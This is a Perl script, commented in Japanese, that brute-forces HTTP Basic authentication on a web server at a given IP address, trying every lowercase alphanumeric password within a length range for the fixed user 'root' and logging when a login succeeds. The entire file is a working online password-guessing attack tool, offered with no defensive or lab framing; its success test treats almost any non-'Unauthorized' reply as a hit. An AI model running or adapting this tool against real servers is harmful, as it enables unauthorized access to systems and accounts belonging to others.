#! /usr/bin/perl
package PassChk::Main;

use strict;
use warnings;
use Try::Tiny;
use Data::Dumper;
use HTTP::Request::Common;
use LWP::UserAgent;

binmode STDIN, ':encoding(utf8)';
binmode STDOUT, ':encoding(utf8)';
binmode STDERR, ':encoding(utf8)';

PassChk::Main->main();

sub main {

    my $class = shift;
    my $main = PassChk::Main->new();
    my %params;
    try {

        # コマンドライン引数の取得
        %params = PassChk::Main->_get_param();

        # コマンドライン引数の入力チェック
        PassChk::Main->_valid($params{'min'}, $params{'max'}, $params{'start_word'});

        # 検索処理
        $main->_search($params{'ip'}, $params{'min'}, $params{'max'}, $params{'start_word'});

        exit 0;

    }catch {

        write_log('ERROR', Dumper \@_ ,$main->{error_log});
		print Dumper \@_;
		exit 1;
     }

}

sub new {
    my $class = shift;

    # パスワード検索プログラムの設定
    my $self = {
    	# パスワード文字種
    	password_str => '0123456789abcdefghijklmnopqrstuvwxyz',
    	# password_str => '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
    	# プログラム開始時のタイムスタンプ
    	start_timestamp => time(),
    	# 進捗ログ出力の間隔（レコード件数を指定）
    	display_per_count=> 50000,
    	# エラーログ出力先
    	error_log 		=> 'error.log',
    	# 進捗ログ出力先
    	proccess_log 	=> 'proccess.log',
    	@_
    };

    return bless $self,  $class;
}

sub _search {
	my $self = shift;
    my ($ip, $min, $max, $start_word) = @_;

    # パスワード文字列のコンテキストを、パスワード文字種のインデックス配列で取り扱う
    my @password_context = ();
    my $password_count = 1;

    # パラメータで、探索を開始するパスワードを指定した場合、
    # 指定した文字のパスワード文字コンテキストを設定
    if ($start_word) {
        @password_context = $self->_find_context_by_word($start_word);

    # パラメータで、探索を開始するパスワードを指定した場合、
    # 最小桁数のパスワード文字コンテキストを設定
    }else {
        @password_context = PassChk::Main->_get_first_context($min);
    }

    # パスワード文字列を取得
    my $current_password = $self->_get_password_by_context(@password_context);

    #　ログイン可能なパスワードを1件ずつ試す
    while(1) {

        # パスワード文字列が最大長を超えていたら終了
        my $password_len =  length $current_password;
        if ($password_len > $max) {
        	last;
        }

        # HTTP通信を行い、認証可否を確認
        my $is_correct = $self->_is_correct_password($ip, $current_password);

        # ログインに成功したら、パスワードを記録して終了
        if ($is_correct == 1) {
            my $elapsed_time = $self->_get_elapsed_time();
            my $message =
                "CONGRATULATIONS! PASSWORD IS FOUND! elapsed time:" . $elapsed_time .
                " count:" . $password_count .
                " correct_password:" . $current_password;

            write_log('INFO', $message , $self->{proccess_log});
            print $message."\n";
            return 0;
        }

        # 指定件数ごとに、時間と試行パスワードを記録
        if ($password_count % $self->{display_per_count} == 0) {
             my $elapsed_time = $self->_get_elapsed_time();
             my $message =
                 " elapsed time:" . $elapsed_time .
                 " count over:" . $password_count .
                 " password:". $current_password;

             write_log('INFO', $message , $self->{proccess_log});
             print $message . "\n";
        }
        # 次に試行するパスワード文字列を取得
        @password_context = $self->_get_next_context(@password_context);
        $current_password = $self->_get_password_by_context(@password_context);
        $password_count++;
    }

    # 見つからなかった旨を記録
    my $elapsed_time = $self->_get_elapsed_time();
    my $message =
        "PASSWORD IS NOT FOUND! elapsed time:" . $elapsed_time .
        " count:" . $password_count;

        write_log('INFO', $message , $self->{proccess_log});
        print $message . "\n";
    return 1;
}

sub _get_first_context {
	my $class = shift;
    my ($min) = @_;
    my @first_context = ();
    for(my $index = 0; $index < $min; $index++) {
        push @first_context, 0;
    }

    return @first_context;
}

sub _get_password_by_context {
	my $self = shift;
    my (@word_context) = @_;
    my $word_length = @word_context;
    my $password = '';
    foreach my $index (@word_context) {
        $password .= substr($self->{password_str}, $index, 1);
    }
    return $password;

}


sub _get_next_context {
	my $self = shift;
    my (@word_context) = @_;
    my $word_length = @word_context;
    my @next_context = ();
    my $is_new_digit = 1;
    my $password_str_length = length $self->{password_str};

    # 次の文字参照を取得
    for(my $index = $word_length -1 ; $index >= 0; $index--) {

		if ($is_new_digit == 0) {
	        return @word_context;
		}

        my $context_value = $word_context[$index];

        # 最後の文字まで試したら、最初の文字に変更
        if ($context_value >= ($password_str_length - 1)) {
        	$word_context[$index] = 0

        # 最後の文字まで試していなければ、次の文字に変更
        }else {
        	$word_context[$index] = $context_value + 1;
        	$is_new_digit = 0;
        }

        # 現在の桁で走査済みなら、桁数を増やす
        if (($index == 0) && ($is_new_digit)) {
            $word_context[$word_length] = 0;
        }
    }

    return @word_context;

}

sub _find_context_by_word {
	my $self = shift;
	my $wardstr = $_[0];
	my $word_len = length $wardstr;
	my @context_list = ();

	for(my $i = 0;  $i < $word_len; $i++) {
	     my $char = substr($wardstr, $i, 1);
	     my $index = index($self->{password_str}, $char);
	     if ($index == -1) {
	          die('undefined char:' . "$char" .
	            ' defined_charlist:' . $self->{password_str});
	     }
	     push @context_list, $index;
	}

	return @context_list;
}

sub _is_correct_password {
    my $self = shift;
    my ($ip, $password) = @_;
    # userはroot固定
    my $user = 'root';

    my $auth_success = 0;

    my $request = HTTP::Request::Common::GET(
    	'http://' . $ip
    	);
    $request->authorization_basic($user, $password);
    my $user_agent = LWP::UserAgent->new;
    my $response = $user_agent->request($request);

    unless (($response->code == '401') || ($response->code == '200')) {
        my $elapsed_time = $self->_get_elapsed_time();
        my $message =
        " UNAVAILABLE RESPONSE! elapsed time:" . $elapsed_time .
        " password:" . $password .
        " code:" . $response->code .
        " message:" . $response->message;

        write_log('WARNING', $message , $self->{error_log});
        print $message . "\n";
    }

    unless ($response->message eq 'Unauthorized' ||
    	$response->message eq "Can't connect to $ip:80 (10060)") {
        $auth_success = 1;
    }

    return $auth_success;
}

sub _get_elapsed_time {
    my $self = shift;
    my $current_time = time();

    # 開始時と現在のタイムスタンプの差を算出
    my $elapsed_time =  $current_time - $self->{start_timestamp};

    my $hour = ($elapsed_time / 3600) >= 1 ? int ($elapsed_time / 3600) : 0;
    my $secbase = $elapsed_time % 3600;
    my $min  = $secbase >= 60 ?  int ($secbase / 60) : 0;
    my $sec  = ($secbase % 60) > 0 ? ($secbase % 60) : 0;

    return "$hour:$min:$sec";

}

sub _get_param{
	my $class = shift;

	# コマンドラインパラメータ
	# 第一パラメータは、探索先のwebサーバがあるIPアドレス
	# 第二パラメータは、探索する最小桁数
	# 第三パラメータは、探索する最大桁数
	# 第四パラメータは、探索を開始するパスワード（任意）
	my %args = (
		'ip'=> trim($ARGV[0]),
		'min'=> trim($ARGV[1]) + 0,
		'max'=> trim($ARGV[2]) + 0,
		'start_word'=> '',
		);

    if (defined $ARGV[3]) {
        $args{'start_word'} = trim($ARGV[3]);
    }

    return %args;
}

sub _valid {
    my $class = shift;
    my ($min, $max, $start_word) = @_;

    if ($min > $max) {
        die('min is more than max. ');
    }

    unless ($start_word) {
    	return;
    }

    my $len = length $start_word;

    if ($len < $min) {
        die('startword is too short. ');
    }

    if ($len > $max) {
        die('startword is too long. ');
    }
}

sub trim {
	my $str = shift;
	$str =~ s/^\s*(.*?)\s*$/$1/;
	return $str;
}

sub write_log {
	my ($level, $message, $file) = @_;
    open FH, '>>', $file;
    print FH $level . ':　' . $message."\n";
    close FH;
}
